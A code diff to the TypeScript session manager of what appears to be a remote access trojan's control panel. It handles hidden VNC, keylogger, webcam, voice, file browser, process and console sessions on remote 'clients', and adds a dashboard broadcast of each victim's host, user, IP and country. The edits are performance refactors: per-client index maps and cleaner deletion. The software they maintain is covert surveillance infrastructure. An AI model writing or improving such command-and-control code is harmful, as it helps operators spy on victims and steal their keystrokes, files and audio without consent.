@@ -22,14 +22,19 @@ const consoleSessions = new Map<string, ConsoleSession>();
 const rdSessions = new Map<string, RemoteDesktopViewer>();
 const webcamSessions = new Map<string, RemoteDesktopViewer>();
 const hvncSessions = new Map<string, RemoteDesktopViewer>(); // HVNC uses same structure as RD
+const consoleSessionsByClient = new Map<string, Set<string>>();
 const rdSessionsByClient = new Map<string, Set<string>>();
 const webcamSessionsByClient = new Map<string, Set<string>>();
 const hvncSessionsByClient = new Map<string, Set<string>>();
 const fileBrowserSessions = new Map<string, FileBrowserViewer>();
 const processSessions = new Map<string, ProcessViewer>();
+const fileBrowserSessionsByClient = new Map<string, Set<string>>();
+const processSessionsByClient = new Map<string, Set<string>>();
 const notificationSessions = new Map<string, NotificationsViewer>();
 const keyloggerSessions = new Map<string, KeyloggerViewer>();
+const keyloggerSessionsByClient = new Map<string, Set<string>>();
 const voiceSessions = new Map<string, VoiceViewer>();
+const voiceSessionsByClient = new Map<string, Set<string>>();
 const dashboardSessions = new Map<string, DashboardViewer>();
 
 function addSessionToClientIndex(
@@ -60,6 +65,7 @@ function removeSessionFromClientIndex(
 
 export function addConsoleSession(session: ConsoleSession): void {
   consoleSessions.set(session.id, session);
+  addSessionToClientIndex(consoleSessionsByClient, session.clientId, session.id);
 }
 
 export function getConsoleSession(
@@ -69,13 +75,22 @@ export function getConsoleSession(
 }
 
 export function deleteConsoleSession(sessionId: string): boolean {
-  return consoleSessions.delete(sessionId);
+  const existing = consoleSessions.get(sessionId);
+  if (!existing) return false;
+  consoleSessions.delete(sessionId);
+  removeSessionFromClientIndex(consoleSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getConsoleSessionsByClient(clientId: string): ConsoleSession[] {
-  return Array.from(consoleSessions.values()).filter(
-    (s) => s.clientId === clientId,
-  );
+  const ids = consoleSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: ConsoleSession[] = [];
+  for (const id of ids) {
+    const session = consoleSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
 }
 
 export function getAllConsoleSessions(): Map<string, ConsoleSession> {
@@ -221,6 +236,7 @@ export function getHvncSessionCount(): number {
 
 export function addFileBrowserSession(session: FileBrowserViewer): void {
   fileBrowserSessions.set(session.id, session);
+  addSessionToClientIndex(fileBrowserSessionsByClient, session.clientId, session.id);
 }
 
 export function getFileBrowserSession(
@@ -230,15 +246,24 @@ export function getFileBrowserSession(
 }
 
 export function deleteFileBrowserSession(sessionId: string): boolean {
-  return fileBrowserSessions.delete(sessionId);
+  const existing = fileBrowserSessions.get(sessionId);
+  if (!existing) return false;
+  fileBrowserSessions.delete(sessionId);
+  removeSessionFromClientIndex(fileBrowserSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getFileBrowserSessionsByClient(
   clientId: string,
 ): FileBrowserViewer[] {
-  return Array.from(fileBrowserSessions.values()).filter(
-    (s) => s.clientId === clientId,
-  );
+  const ids = fileBrowserSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: FileBrowserViewer[] = [];
+  for (const id of ids) {
+    const session = fileBrowserSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
 }
 
 export function getAllFileBrowserSessions(): Map<string, FileBrowserViewer> {
@@ -247,6 +272,7 @@ export function getAllFileBrowserSessions(): Map<string, FileBrowserViewer> {
 
 export function addProcessSession(session: ProcessViewer): void {
   processSessions.set(session.id, session);
+  addSessionToClientIndex(processSessionsByClient, session.clientId, session.id);
 }
 
 export function getProcessSession(
@@ -256,13 +282,22 @@ export function getProcessSession(
 }
 
 export function deleteProcessSession(sessionId: string): boolean {
-  return processSessions.delete(sessionId);
+  const existing = processSessions.get(sessionId);
+  if (!existing) return false;
+  processSessions.delete(sessionId);
+  removeSessionFromClientIndex(processSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getProcessSessionsByClient(clientId: string): ProcessViewer[] {
-  return Array.from(processSessions.values()).filter(
-    (s) => s.clientId === clientId,
-  );
+  const ids = processSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: ProcessViewer[] = [];
+  for (const id of ids) {
+    const session = processSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
 }
 
 export function getAllProcessSessions(): Map<string, ProcessViewer> {
@@ -337,6 +372,7 @@ export function safeSendViewerFrame(
 
 export function addKeyloggerSession(session: KeyloggerViewer): void {
   keyloggerSessions.set(session.id, session);
+  addSessionToClientIndex(keyloggerSessionsByClient, session.clientId, session.id);
 }
 
 export function getKeyloggerSession(
@@ -346,15 +382,24 @@ export function getKeyloggerSession(
 }
 
 export function deleteKeyloggerSession(sessionId: string): boolean {
-  return keyloggerSessions.delete(sessionId);
+  const existing = keyloggerSessions.get(sessionId);
+  if (!existing) return false;
+  keyloggerSessions.delete(sessionId);
+  removeSessionFromClientIndex(keyloggerSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getKeyloggerSessionsByClient(
   clientId: string,
 ): KeyloggerViewer[] {
-  return Array.from(keyloggerSessions.values()).filter(
-    (s) => s.clientId === clientId,
-  );
+  const ids = keyloggerSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: KeyloggerViewer[] = [];
+  for (const id of ids) {
+    const session = keyloggerSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
 }
 
 export function getAllKeyloggerSessions(): Map<string, KeyloggerViewer> {
@@ -363,6 +408,7 @@ export function getAllKeyloggerSessions(): Map<string, KeyloggerViewer> {
 
 export function addVoiceSession(session: VoiceViewer): void {
   voiceSessions.set(session.id, session);
+  addSessionToClientIndex(voiceSessionsByClient, session.clientId, session.id);
 }
 
 export function getVoiceSession(sessionId: string): VoiceViewer | undefined {
@@ -370,11 +416,22 @@ export function getVoiceSession(sessionId: string): VoiceViewer | undefined {
 }
 
 export function deleteVoiceSession(sessionId: string): boolean {
-  return voiceSessions.delete(sessionId);
+  const existing = voiceSessions.get(sessionId);
+  if (!existing) return false;
+  voiceSessions.delete(sessionId);
+  removeSessionFromClientIndex(voiceSessionsByClient, existing.clientId, sessionId);
+  return true;
 }
 
 export function getVoiceSessionsByClient(clientId: string): VoiceViewer[] {
-  return Array.from(voiceSessions.values()).filter((s) => s.clientId === clientId);
+  const ids = voiceSessionsByClient.get(clientId);
+  if (!ids || ids.size === 0) return [];
+  const sessions: VoiceViewer[] = [];
+  for (const id of ids) {
+    const session = voiceSessions.get(id);
+    if (session) sessions.push(session);
+  }
+  return sessions;
 }
 
 export function getAllVoiceSessions(): Map<string, VoiceViewer> {
@@ -399,6 +456,30 @@ export function getDashboardSessionCount(): number {
 
 let dashboardBroadcastTimer: ReturnType<typeof setTimeout> | null = null;
 const DASHBOARD_DEBOUNCE_MS = 150;
+
+export function notifyDashboardClientEvent(
+  event: "client_online" | "client_offline" | "client_purgatory",
+  info: { id: string; host?: string; user?: string; os?: string; ip?: string; country?: string },
+): void {
+  const msg = JSON.stringify({
+    type: "client_event",
+    event,
+    clientId: info.id,
+    host: info.host,
+    user: info.user,
+    os: info.os,
+    ip: info.ip,
+    country: info.country,
+    ts: Date.now(),
+  });
+  for (const [id, session] of dashboardSessions) {
+    try {
+      session.viewer.send(msg);
+    } catch {
+      dashboardSessions.delete(id);
+    }
+  }
+}
 
 export function notifyDashboardViewers(): void {
   if (dashboardBroadcastTimer) return;
